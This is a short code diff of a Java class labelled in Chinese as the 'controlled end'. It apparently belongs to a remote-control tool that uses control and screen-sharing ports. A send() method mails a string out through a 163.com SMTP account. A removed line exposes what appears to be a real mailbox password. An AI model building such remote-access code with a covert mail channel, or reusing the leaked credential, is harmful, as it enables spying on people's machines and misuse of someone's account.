@@ -17,6 +17,9 @@ import java.net.Socket;
 import java.util.Enumeration;
 import java.util.Properties;
 
+/*
+被控制端
+ */
 public class Main {
     final int PORT = 1220;
     final int PORT_FOR_SCREEN=1222;
@@ -530,11 +533,11 @@ public class Main {
         boolean sended = false;
 
         void send(String str){
-            String to = "alexmo001@qq.com"; // 收件人的邮件地址
+            String to = "alexmo573@qq.com"; // 收件人的邮件地址
             String from = "alexmo573@163.com"; // 发件人的邮件地址
             String host = "smtp.163.com"; // 发件人的邮件服务器地址
             String user = "alexmo573@163.com"; // 发件人的邮箱账号
-            String password = "RBCTOJKIFTUAVWVL"; // 发件人的邮箱密码
+            String password = ""; // 发件人的邮箱密码
 
             // 创建一个邮件会话对象
             Properties properties = new Properties();
